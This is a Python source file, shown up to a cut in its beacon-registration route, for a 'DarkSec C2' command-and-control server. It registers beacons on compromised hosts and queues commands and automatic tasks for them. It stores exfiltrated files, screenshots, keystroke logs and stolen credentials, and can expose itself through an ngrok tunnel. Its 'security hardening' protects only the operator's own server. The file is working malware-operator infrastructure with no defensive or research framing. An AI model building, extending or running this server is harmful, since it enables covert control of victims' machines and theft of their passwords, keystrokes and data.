#!/usr/bin/env python3
"""
DarkSec C2 Server - Security Hardened Edition
All security vulnerabilities addressed with enterprise-grade protections
"""

import os
import sys
import json
import time
import sqlite3
import hashlib
import base64
import io
import gzip
import csv
import ssl
import subprocess
import logging
import re
from datetime import datetime, timedelta
from threading import Thread, Lock
from collections import defaultdict, deque
from pathlib import Path

from flask import Flask, request, jsonify, render_template_string, send_file, Response, abort
from flask_sock import Sock
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
import secrets

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Plugin system
PLUGINS = {}

def register_plugin(name):
    """Decorator to register plugins"""
    def decorator(func):
        PLUGINS[name] = func
        return func
    return decorator

# ============================================================================
# SECURITY: Input Validation & Sanitization
# ============================================================================

class InputValidator:
    """Centralized input validation"""
    
    # Whitelist of allowed table names (prevents SQL injection)
    ALLOWED_TABLES = {
        'beacons', 'commands', 'credentials', 'exfil_data',
        'screenshots', 'keylogs', 'sessions', 'tasks',
        'auto_tasks', 'api_keys', 'audit_log'
    }
    
    # Whitelist of allowed export formats
    ALLOWED_FORMATS = {'csv', 'json'}
    
    # Whitelist of allowed roles
    ALLOWED_ROLES = {'admin', 'operator', 'viewer'}
    
    # Regex patterns for validation
    BEACON_ID_PATTERN = re.compile(r'^[a-f0-9]{32}$')
    USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{3,32}$')
    TAG_PATTERN = re.compile(r'^[a-zA-Z0-9_,-]{0,200}$')
    
    @staticmethod
    def validate_table_name(table_name):
        """Validate table name against whitelist"""
        if table_name not in InputValidator.ALLOWED_TABLES:
            raise ValueError(f"Invalid table name: {table_name}")
        return table_name
    
    @staticmethod
    def validate_export_format(format_name):
        """Validate export format"""
        if format_name not in InputValidator.ALLOWED_FORMATS:
            raise ValueError(f"Invalid format: {format_name}")
        return format_name
    
    @staticmethod
    def validate_role(role):
        """Validate role"""
        if role not in InputValidator.ALLOWED_ROLES:
            raise ValueError(f"Invalid role: {role}")
        return role
    
    @staticmethod
    def validate_beacon_id(beacon_id):
        """Validate beacon ID format"""
        if not InputValidator.BEACON_ID_PATTERN.match(beacon_id):
            raise ValueError("Invalid beacon ID format")
        return beacon_id
    
    @staticmethod
    def validate_username(username):
        """Validate username format"""
        if not InputValidator.USERNAME_PATTERN.match(username):
            raise ValueError("Invalid username format")
        return username
    
    @staticmethod
    def validate_tags(tags):
        """Validate tags format"""
        if not InputValidator.TAG_PATTERN.match(tags):
            raise ValueError("Invalid tags format")
        return tags
    
    @staticmethod
    def validate_limit(limit, max_limit=1000):
        """Validate limit parameter"""
        try:
            limit = int(limit)
            if limit < 1 or limit > max_limit:
                raise ValueError
            return limit
        except (ValueError, TypeError):
            raise ValueError(f"Invalid limit (must be 1-{max_limit})")
    
    @staticmethod
    def sanitize_string(s, max_length=1000):
        """Sanitize string input"""
        if not isinstance(s, str):
            raise ValueError("Input must be string")
        if len(s) > max_length:
            raise ValueError(f"Input too long (max {max_length})")
        # Remove null bytes and control characters
        s = s.replace('\x00', '')
        s = ''.join(char for char in s if ord(char) >= 32 or char in '\n\r\t')
        return s

# ============================================================================
# SECURITY: Rate Limiting
# ============================================================================

class RateLimiter:
    """Token bucket rate limiter"""
    
    def __init__(self, capacity=100, refill_rate=10):
        """
        capacity: max requests per window
        refill_rate: requests added per second
        """
        self.capacity = capacity
        self.refill_rate = refill_rate
        self.buckets = defaultdict(lambda: {'tokens': capacity, 'last_update': time.time()})
        self.lock = Lock()
    
    def is_allowed(self, key):
        """Check if request is allowed"""
        with self.lock:
            bucket = self.buckets[key]
            now = time.time()
            
            # Refill tokens based on time elapsed
            elapsed = now - bucket['last_update']
            bucket['tokens'] = min(
                self.capacity,
                bucket['tokens'] + (elapsed * self.refill_rate)
            )
            bucket['last_update'] = now
            
            # Check if request can be served
            if bucket['tokens'] >= 1:
                bucket['tokens'] -= 1
                return True
            return False
    
    def cleanup_old_entries(self, max_age=3600):
        """Remove old entries to prevent memory leak"""
        with self.lock:
            now = time.time()
            to_remove = [
                key for key, bucket in self.buckets.items()
                if now - bucket['last_update'] > max_age
            ]
            for key in to_remove:
                del self.buckets[key]

# ============================================================================
# SECURITY: Request Logging & Audit
# ============================================================================

class RequestLogger:
    """Log all API requests for security audit"""
    
    def __init__(self, log_file='api_requests.log'):
        self.log_file = log_file
        self.logger = logging.getLogger('api_requests')
        handler = logging.FileHandler(log_file)
        handler.setFormatter(logging.Formatter(
            '%(asctime)s | %(message)s'
        ))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def log_request(self, ip, method, path, user, status_code):
        """Log API request"""
        self.logger.info(
            f"{ip} | {method} | {path} | {user} | {status_code}"
        )

# ============================================================================
# Original Classes with Security Enhancements
# ============================================================================

class EncryptionManager:
    """Handle encryption/decryption for exfil data"""
    
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_data(self, data):
        """Encrypt and compress data"""
        try:
            if isinstance(data, str):
                data = data.encode()
            compressed = gzip.compress(data)
            encrypted = self.cipher.encrypt(compressed)
            return encrypted
        except Exception as e:
            logger.error(f"Encryption error: {e}", exc_info=True)
            raise
    
    def decrypt_data(self, encrypted_data):
        """Decrypt and decompress data"""
        try:
            decrypted = self.cipher.decrypt(encrypted_data)
            decompressed = gzip.decompress(decrypted)
            return decompressed
        except Exception as e:
            logger.error(f"Decryption error: {e}", exc_info=True)
            raise
    
    def save_key(self, filepath='encryption_key.bin'):
        """Save encryption key"""
        try:
            with open(filepath, 'wb') as f:
                f.write(self.key)
            os.chmod(filepath, 0o600)  # Owner read/write only
            logger.info(f"Encryption key saved to {filepath}")
        except Exception as e:
            logger.error(f"Failed to save encryption key: {e}", exc_info=True)
            raise
    
    def load_key(self, filepath='encryption_key.bin'):
        """Load encryption key"""
        if os.path.exists(filepath):
            try:
                with open(filepath, 'rb') as f:
                    self.key = f.read()
                    self.cipher = Fernet(self.key)
                logger.info("Encryption key loaded")
            except Exception as e:
                logger.error(f"Failed to load encryption key: {e}", exc_info=True)
                raise

class SSLManager:
    """Manage SSL/TLS certificates"""
    
    @staticmethod
    def generate_self_signed_cert(cert_file='cert.pem', key_file='key.pem'):
        """Generate self-signed SSL certificate"""
        try:
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # Write private key
            with open(key_file, 'wb') as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            os.chmod(key_file, 0o600)
            
            # Generate certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Cyber"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, u"Dark"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"DarkSec"),
                x509.NameAttribute(NameOID.COMMON_NAME, u"darksec.local"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=365)
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Write certificate
            with open(cert_file, 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            logger.info(f"Generated SSL certificate: {cert_file}, {key_file}")
            return cert_file, key_file
        except Exception as e:
            logger.error(f"Failed to generate SSL certificate: {e}", exc_info=True)
            raise

class NgrokManager:
    """Manage ngrok tunnels"""
    
    def __init__(self):
        self.process = None
        self.public_url = None
    
    def start_tunnel(self, port, auth_token=None):
        """Start ngrok tunnel"""
        try:
            if auth_token:
                subprocess.run(['ngrok', 'authtoken', auth_token], check=True)
            
            self.process = subprocess.Popen(
                ['ngrok', 'http', str(port), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            import requests
            try:
                resp = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                tunnels = resp.json()['tunnels']
                if tunnels:
                    self.public_url = tunnels[0]['public_url']
                    logger.info(f"Ngrok tunnel active: {self.public_url}")
                    return self.public_url
            except Exception as e:
                logger.warning(f"Could not fetch ngrok URL: {e}")
            
            return None
        except Exception as e:
            logger.error(f"Ngrok error: {e}", exc_info=True)
            return None
    
    def stop_tunnel(self):
        """Stop ngrok tunnel"""
        if self.process:
            self.process.terminate()
            self.process = None
            logger.info("Ngrok tunnel stopped")

class C2Database:
    """Enhanced SQLite database with security fixes"""
    
    def __init__(self, db_path='c2_data.db'):
        self.db_path = db_path
        self.conn = None
        self.lock = Lock()
        self.init_db()
    
    def init_db(self):
        """Initialize database schema with new tables"""
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            cursor = self.conn.cursor()
            
            # Beacons table (enhanced with tags)
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS beacons (
                    id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    os_type TEXT,
                    ip_address TEXT,
                    first_seen TIMESTAMP,
                    last_seen TIMESTAMP,
                    status TEXT,
                    metadata TEXT,
                    tags TEXT,
                    group_name TEXT,
                    health_status TEXT DEFAULT 'healthy'
                )
            ''')
            
            # Commands table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    command TEXT,
                    timestamp TIMESTAMP,
                    status TEXT,
                    result TEXT,
                    operator TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Exfiltrated data table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS exfil_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    data_type TEXT,
                    filename TEXT,
                    data BLOB,
                    encrypted BOOLEAN DEFAULT 1,
                    timestamp TIMESTAMP,
                    file_size INTEGER,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Enhanced API keys table with roles
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS api_keys (
                    key_hash TEXT PRIMARY KEY,
                    username TEXT,
                    role TEXT,
                    description TEXT,
                    created TIMESTAMP,
                    last_used TIMESTAMP,
                    permissions TEXT
                )
            ''')
            
            # Sessions table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    beacon_id TEXT,
                    session_type TEXT,
                    created TIMESTAMP,
                    last_active TIMESTAMP,
                    status TEXT,
                    metadata TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Screenshots table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS screenshots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    image_data BLOB,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Keylog table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    keystrokes TEXT,
                    window_title TEXT,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Credentials table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    source TEXT,
                    username TEXT,
                    password TEXT,
                    domain TEXT,
                    timestamp TIMESTAMP,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Tasks table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    beacon_id TEXT,
                    task_type TEXT,
                    task_data TEXT,
                    schedule_time TIMESTAMP,
                    executed BOOLEAN DEFAULT 0,
                    result TEXT,
                    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
                )
            ''')
            
            # Auto-tasks table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS auto_tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    task_name TEXT,
                    command TEXT,
                    enabled BOOLEAN DEFAULT 1,
                    trigger_condition TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Beacon groups table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS beacon_groups (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    group_name TEXT UNIQUE,
                    description TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Listener profiles table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS listener_profiles (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    profile_name TEXT UNIQUE,
                    port INTEGER,
                    protocol TEXT,
                    enabled BOOLEAN DEFAULT 1,
                    metadata TEXT,
                    created TIMESTAMP
                )
            ''')
            
            # Audit log table
            cursor.execute('''\
                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP,
                    operator TEXT,
                    action TEXT,
                    target TEXT,
                    details TEXT
                )
            ''')
            
            self.conn.commit()
            logger.info("Database initialized successfully")
        except Exception as e:
            logger.error(f"Database initialization failed: {e}", exc_info=True)
            raise
    
    def register_beacon(self, beacon_id, hostname, username, os_type, ip_address, metadata, tags=''):
        """Register new beacon with tags - SECURITY: Validates inputs"""
        try:
            # Validate inputs
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            hostname = InputValidator.sanitize_string(hostname, 255)
            username = InputValidator.sanitize_string(username, 255)
            os_type = InputValidator.sanitize_string(os_type, 100)
            tags = InputValidator.validate_tags(tags)
            
            with self.lock:
                cursor = self.conn.cursor()
                now = datetime.now().isoformat()
                
                cursor.execute('''\
                    INSERT OR REPLACE INTO beacons 
                    (id, hostname, username, os_type, ip_address, first_seen, last_seen, status, metadata, tags, health_status)
                    VALUES (?, ?, ?, ?, ?, 
                        COALESCE((SELECT first_seen FROM beacons WHERE id = ?), ?),
                        ?, 'active', ?, ?, 'healthy')
                ''', (beacon_id, hostname, username, os_type, ip_address, 
                      beacon_id, now, now, json.dumps(metadata), tags))
                
                self.conn.commit()
                logger.info(f"Beacon registered: {beacon_id}")
                return beacon_id
        except Exception as e:
            logger.error(f"Failed to register beacon: {e}", exc_info=True)
            raise
    
    def update_beacon_health(self, beacon_id, health_status):
        """Update beacon health status"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('UPDATE beacons SET health_status = ? WHERE id = ?', (health_status, beacon_id))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update beacon health: {e}", exc_info=True)
            raise
    
    def get_beacons(self, active_only=False, group=None, tags=None):
        """Get beacons with filtering options - SECURITY: Safe parameterized queries"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                query = 'SELECT * FROM beacons WHERE 1=1'
                params = []
                
                if active_only:
                    query += ' AND status = ?'
                    params.append('active')
                if group:
                    group = InputValidator.sanitize_string(group, 100)
                    query += ' AND group_name = ?'
                    params.append(group)
                if tags:
                    tags = InputValidator.validate_tags(tags)
                    query += ' AND tags LIKE ?'
                    params.append(f'%{tags}%')
                
                query += ' ORDER BY last_seen DESC'
                cursor.execute(query, params)
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get beacons: {e}", exc_info=True)
            raise
    
    def add_command(self, beacon_id, command, operator='system'):
        """Add command with operator tracking - SECURITY: Validates inputs"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            command = InputValidator.sanitize_string(command, 10000)
            operator = InputValidator.sanitize_string(operator, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO commands (beacon_id, command, timestamp, status, operator)
                    VALUES (?, ?, ?, 'pending', ?)
                ''', (beacon_id, command, datetime.now().isoformat(), operator))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add command: {e}", exc_info=True)
            raise
    
    def get_command_history(self, beacon_id, limit=100):
        """Get command history for beacon - SECURITY: Validates limit"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            limit = InputValidator.validate_limit(limit, 1000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    SELECT id, command, timestamp, status, result, operator
                    FROM commands 
                    WHERE beacon_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?
                ''', (beacon_id, limit))
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get command history: {e}", exc_info=True)
            raise
    
    def get_pending_commands(self, beacon_id):
        """Get pending commands"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    SELECT id, command FROM commands 
                    WHERE beacon_id = ? AND status = 'pending'
                    ORDER BY timestamp ASC
                ''', (beacon_id,))
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get pending commands: {e}", exc_info=True)
            raise
    
    def update_command_result(self, command_id, result):
        """Update command result"""
        try:
            command_id = int(command_id)
            result = InputValidator.sanitize_string(result, 100000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    UPDATE commands 
                    SET status = 'completed', result = ?
                    WHERE id = ?
                ''', (result, command_id))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update command result: {e}", exc_info=True)
            raise
    
    def store_exfil_data(self, beacon_id, data_type, filename, data, encrypted=True):
        """Store encrypted exfil data"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            data_type = InputValidator.sanitize_string(data_type, 100)
            filename = InputValidator.sanitize_string(filename, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                file_size = len(data) if data else 0
                cursor.execute('''\
                    INSERT INTO exfil_data (beacon_id, data_type, filename, data, encrypted, timestamp, file_size)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (beacon_id, data_type, filename, data, encrypted, datetime.now().isoformat(), file_size))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store exfil data: {e}", exc_info=True)
            raise
    
    def create_api_key(self, username, role='operator', permissions='read,write'):
        """Create API key with role - SECURITY: Validates inputs"""
        try:
            username = InputValidator.validate_username(username)
            role = InputValidator.validate_role(role)
            permissions = InputValidator.sanitize_string(permissions, 200)
            
            with self.lock:
                key = secrets.token_urlsafe(32)
                key_hash = hashlib.sha256(key.encode()).hexdigest()
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO api_keys (key_hash, username, role, description, created, permissions)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (key_hash, username, role, f'{role} key for {username}', datetime.now().isoformat(), permissions))
                self.conn.commit()
                logger.info(f"API key created for user: {username}")
                return key
        except Exception as e:
            logger.error(f"Failed to create API key: {e}", exc_info=True)
            raise
    
    def verify_api_key(self, key):
        """Verify API key and return user info"""
        if not key:
            return None
        
        try:
            key_hash = hashlib.sha256(key.encode()).hexdigest()
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('SELECT username, role, permissions FROM api_keys WHERE key_hash = ?', (key_hash,))
                result = cursor.fetchone()
                if result:
                    # Update last used
                    cursor.execute('UPDATE api_keys SET last_used = ? WHERE key_hash = ?', 
                                 (datetime.now().isoformat(), key_hash))
                    self.conn.commit()
                    return {'username': result[0], 'role': result[1], 'permissions': result[2].split(',')}
                return None
        except Exception as e:
            logger.error(f"Failed to verify API key: {e}", exc_info=True)
            return None
    
    def add_auto_task(self, task_name, command, trigger_condition='on_register'):
        """Add auto-task - SECURITY: Validates inputs"""
        try:
            task_name = InputValidator.sanitize_string(task_name, 255)
            command = InputValidator.sanitize_string(command, 10000)
            trigger_condition = InputValidator.sanitize_string(trigger_condition, 100)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO auto_tasks (task_name, command, enabled, trigger_condition, created)
                    VALUES (?, ?, 1, ?, ?)
                ''', (task_name, command, trigger_condition, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add auto-task: {e}", exc_info=True)
            raise
    
    def get_auto_tasks(self, trigger_condition=None):
        """Get auto-tasks"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                if trigger_condition:
                    trigger_condition = InputValidator.sanitize_string(trigger_condition, 100)
                    cursor.execute('SELECT * FROM auto_tasks WHERE enabled = 1 AND trigger_condition = ?', (trigger_condition,))
                else:
                    cursor.execute('SELECT * FROM auto_tasks WHERE enabled = 1')
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get auto-tasks: {e}", exc_info=True)
            raise
    
    def add_audit_log(self, operator, action, target, details=''):
        """Add audit log entry"""
        try:
            operator = InputValidator.sanitize_string(operator, 255)
            action = InputValidator.sanitize_string(action, 255)
            target = InputValidator.sanitize_string(target, 255)
            details = InputValidator.sanitize_string(details, 10000)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO audit_log (timestamp, operator, action, target, details)
                    VALUES (?, ?, ?, ?, ?)
                ''', (datetime.now().isoformat(), operator, action, target, details))
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add audit log: {e}", exc_info=True)
    
    def export_to_csv(self, table_name, output_file):
        """Export table to CSV - SECURITY: Validates table name"""
        try:
            table_name = InputValidator.validate_table_name(table_name)
            
            with self.lock:
                cursor = self.conn.cursor()
                # Safe to use f-string here since table_name is validated
                cursor.execute(f'SELECT * FROM {table_name}')
                rows = cursor.fetchall()
                
                if rows:
                    columns = [description[0] for description in cursor.description]
                    with open(output_file, 'w', newline='') as f:
                        writer = csv.writer(f)
                        writer.writerow(columns)
                        writer.writerows(rows)
                    return True
                return False
        except Exception as e:
            logger.error(f"Failed to export to CSV: {e}", exc_info=True)
            raise
    
    def store_screenshot(self, beacon_id, image_data):
        """Store screenshot"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO screenshots (beacon_id, image_data, timestamp)
                    VALUES (?, ?, ?)
                ''', (beacon_id, image_data, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store screenshot: {e}", exc_info=True)
            raise
    
    def store_keylog(self, beacon_id, keystrokes, window_title):
        """Store keylog"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            keystrokes = InputValidator.sanitize_string(keystrokes, 100000)
            window_title = InputValidator.sanitize_string(window_title, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO keylogs (beacon_id, keystrokes, window_title, timestamp)
                    VALUES (?, ?, ?, ?)
                ''', (beacon_id, keystrokes, window_title, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store keylog: {e}", exc_info=True)
            raise
    
    def store_credentials(self, beacon_id, source, username, password, domain=''):
        """Store credentials"""
        try:
            beacon_id = InputValidator.validate_beacon_id(beacon_id)
            source = InputValidator.sanitize_string(source, 255)
            username = InputValidator.sanitize_string(username, 255)
            password = InputValidator.sanitize_string(password, 255)
            domain = InputValidator.sanitize_string(domain, 255)
            
            with self.lock:
                cursor = self.conn.cursor()
                cursor.execute('''\
                    INSERT INTO credentials (beacon_id, source, username, password, domain, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (beacon_id, source, username, password, domain, datetime.now().isoformat()))
                self.conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to store credentials: {e}", exc_info=True)
            raise
    
    def get_credentials(self, beacon_id=None):
        """Get credentials"""
        try:
            with self.lock:
                cursor = self.conn.cursor()
                if beacon_id:
                    beacon_id = InputValidator.validate_beacon_id(beacon_id)
                    cursor.execute('SELECT * FROM credentials WHERE beacon_id = ?', (beacon_id,))
                else:
                    cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC')
                return cursor.fetchall()
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}", exc_info=True)
            raise

class HealthMonitor:
    """Monitor beacon health"""
    
    def __init__(self, db):
        self.db = db
        self.running = False
        self.thread = None
    
    def start(self):
        """Start health monitoring"""
        self.running = True
        self.thread = Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        logger.info("Health monitoring started")
    
    def stop(self):
        """Stop health monitoring"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        logger.info("Health monitoring stopped")
    
    def _monitor_loop(self):
        """Monitor beacons for health issues"""
        while self.running:
            try:
                beacons = self.db.get_beacons()
                now = datetime.now()
                
                for beacon in beacons:
                    beacon_id = beacon[0]
                    last_seen = datetime.fromisoformat(beacon[6])
                    
                    time_diff = (now - last_seen).total_seconds()
                    
                    if time_diff > 600:
                        self.db.update_beacon_health(beacon_id, 'dead')
                    elif time_diff > 300:
                        self.db.update_beacon_health(beacon_id, 'warning')
                    else:
                        self.db.update_beacon_health(beacon_id, 'healthy')
                
            except Exception as e:
                logger.error(f"Health monitor error: {e}", exc_info=True)
            
            time.sleep(30)

# ============================================================================
# SECURITY: Enhanced C2 Server with Security Fixes
# ============================================================================

class C2Server:
    """Security-hardened C2 Server"""
    
    def __init__(self, host='0.0.0.0', port=8443, use_ssl=False, use_ngrok=False, ngrok_token=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.use_ngrok = use_ngrok
        self.app = Flask(__name__)
        self.sock = Sock(self.app)
        self.app.secret_key = secrets.token_hex(32)
        
        # Initialize security components
        self.rate_limiter = RateLimiter(capacity=100, refill_rate=10)
        self.request_logger = RequestLogger()
        
        # Initialize components
        self.db = C2Database()
        self.encryption = EncryptionManager()
        self.encryption.load_key()
        if not os.path.exists('encryption_key.bin'):
            self.encryption.save_key()
        
        self.health_monitor = HealthMonitor(self.db)
        self.ngrok_manager = NgrokManager() if use_ngrok else None
        
        # WebSocket connections
        self.ws_connections = {}
        
        # Generate master key
        self.master_key = self._generate_master_key()
        
        # Setup SSL if enabled
        self.ssl_context = None
        if use_ssl:
            if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
                SSLManager.generate_self_signed_cert()
            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.ssl_context.load_cert_chain('cert.pem', 'key.pem')
        
        # Add security headers
        @self.app.after_request
        def add_security_headers(response):
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['X-Frame-Options'] = 'DENY'
            response.headers['X-XSS-Protection'] = '1; mode=block'
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
            response.headers['Content-Security-Policy'] = "default-src 'self'"
            return response
        
        # Setup routes
        self._setup_routes()
        
        # Start health monitoring
        self.health_monitor.start()
        
        # Periodic rate limiter cleanup
        self._start_rate_limiter_cleanup()
        
        logger.info(f"Master API Key: {self.master_key}")
        logger.warning("Save this key - it won't be shown again!")
        
        # Start ngrok if enabled
        if use_ngrok and self.ngrok_manager:
            public_url = self.ngrok_manager.start_tunnel(port, ngrok_token)
            if public_url:
                logger.info(f"Public URL: {public_url}")
    
    def _generate_master_key(self):
        """Generate master API key"""
        key = self.db.create_api_key('admin', 'admin', 'read,write,delete,export,manage_users')
        return key
    
    def _verify_permission(self, api_key, required_permission):
        """Verify API key has required permission"""
        user_info = self.db.verify_api_key(api_key)
        if not user_info:
            return False
        return required_permission in user_info['permissions'] or user_info['role'] == 'admin'
    
    def _check_rate_limit(self, identifier):
        """Check rate limit for identifier"""
        if not self.rate_limiter.is_allowed(identifier):
            logger.warning(f"Rate limit exceeded for: {identifier}")
            return False
        return True
    
    def _log_request(self, user='anonymous', status_code=200):
        """Log API request"""
        self.request_logger.log_request(
            request.remote_addr,
            request.method,
            request.path,
            user,
            status_code
        )
    
    def _start_rate_limiter_cleanup(self):
        """Start periodic cleanup of rate limiter"""
        def cleanup_loop():
            while True:
                time.sleep(3600)  # Every hour
                self.rate_limiter.cleanup_old_entries()
        
        thread = Thread(target=cleanup_loop, daemon=True)
        thread.start()
    
    def _setup_routes(self):
        """Setup Flask routes with security enhancements"""
        
        # Web UI
        @self.app.route('/')
        def index():
            return render_template_string('''
                <!DOCTYPE html>
                <html>
                <head><title>DarkSec C2 - Secure Edition</title></head>
                <body>
                    <h1>DarkSec C2 Server - Security Hardened</h1>
                    <p>API documentation available at /api/docs</p>
                </body>
                </html>
            ''')
        
        # API: Beacon registration with auto-tasks
        @self.app.route('/api/beacon/register', methods=['POST'])
        def beacon_register():
            try:
                # Rate limit by IP
                if not self._check_rate_limit(request.remote_addr):
                    abort(429)
                
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                beacon_id = data.get('beacon_id')
                hostname = data.get('hostname', 'unknown')
                username = data.get('username', 'unknown')
                os_type = data.get('os', 'unknown')
                ip_address = request.remote_addr
                metadata = data.get('metadata', {})
                tags = data.get('tags', '')
                
                if not beacon_id:
